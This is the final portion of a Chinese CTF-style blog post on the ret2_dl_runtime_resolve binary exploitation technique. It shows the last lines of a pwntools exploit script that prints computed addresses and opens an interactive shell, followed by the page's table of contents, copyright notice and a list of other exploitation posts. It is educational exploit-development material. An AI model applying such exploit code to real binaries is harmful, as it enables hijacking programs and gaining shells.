class="string">"n: "</span> + hex(n))</span><br><span class="line">success(<span class="string">"r_info: "</span> + hex(r_info))</span><br><span class="line">success(<span class="string">"offset: "</span> + hex(str_offset))</span><br><span class="line">success(<span class="string">"system_addr: "</span> + hex(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">"bss_addr: "</span> + hex(elf.bss()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2019/03/26/ret2_dl_runtime_resolve/">ret2_dl_runtime_resolve</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
        <p><span>发布时间:</span>2019年03月26日 - 23时33分</p>
        <p><span>最后更新:</span>2019年03月26日 - 23时33分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2019/03/26/ret2_dl_runtime_resolve/" title="ret2_dl_runtime_resolve">https://cc-sir.github.io/2019/03/26/ret2_dl_runtime_resolve/</a>
            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/03/26/ret2_dl_runtime_resolve/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2019/03/28/pwnf/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          hctf2016-fheap
        
      </div>
    </a>
  
  
    <a href="/2019/03/16/PE文件格式/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">PE文件格式</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ELF关于动态链接的关键section"><span class="toc-number">2.</span> <span class="toc-text">ELF关于动态链接的关键section</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dynamic"><span class="toc-number">2.1.</span> <span class="toc-text">.dynamic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dynsym"><span class="toc-number">2.2.</span> <span class="toc-text">.dynsym</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dynstr"><span class="toc-number">2.3.</span> <span class="toc-text">.dynstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rel-plt"><span class="toc-number">2.4.</span> <span class="toc-text">.rel.plt</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dl-runtime-resolve函数具体运行模式"><span class="toc-number">3.</span> <span class="toc-text">_dl_runtime_resolve函数具体运行模式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">4.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#计算index-arg"><span class="toc-number">4.1.</span> <span class="toc-text">计算index_arg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#r-info的计算方法"><span class="toc-number">4.2.</span> <span class="toc-text">r_info的计算方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算name-offset"><span class="toc-number">4.3.</span> <span class="toc-text">计算name_offset</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>







    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2019/03/28/pwnf/" title="上一篇: hctf2016-fheap">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2019/03/16/PE文件格式/" title="下一篇: PE文件格式">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/Linux-kernel-exploit2/">Linux Kernel Exploit 内核漏洞学习(2)-ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/Linux-kernel3/">Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/Linux-kernel-1/">Linux Kernel Exploit 内核漏洞学习(1)-Double Fetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/Linux-kernel-0/">Linux kernel Exploit 内核漏洞学习(0)-环境安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/12/hackinos/">HackInOS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/23/fmtstr_payload/">Fmtstr_Loop</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/滑雪大冒险内购/">滑雪大冒险2 App内购</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/pwnf/">hctf2016-fheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/ret2_dl_runtime_resolve/">ret2_dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/PE文件格式/">PE文件格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/namebook/">namebook</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/unlink/">Unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/Tcache/">Hgame2019_babytcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/pwnable_tw/">pwnable.tw</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/hacknote/">pwnable.tw_hacknote</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/29/dynelf/">DynELF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/28/ichunqiu_easypwn/">Ichunqiu_Easypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/26/ret2libc/">Ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/24/ret2shellcode/">Ret2ShellCode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/20/overflow_freed_chunk/">Overflow Freed Chunk</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/Fastbin_Double_Free/">Fastbin Double Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/use_after_free/">Use After Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/hello-world/">Hello World</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2019 钞sir
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit">海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>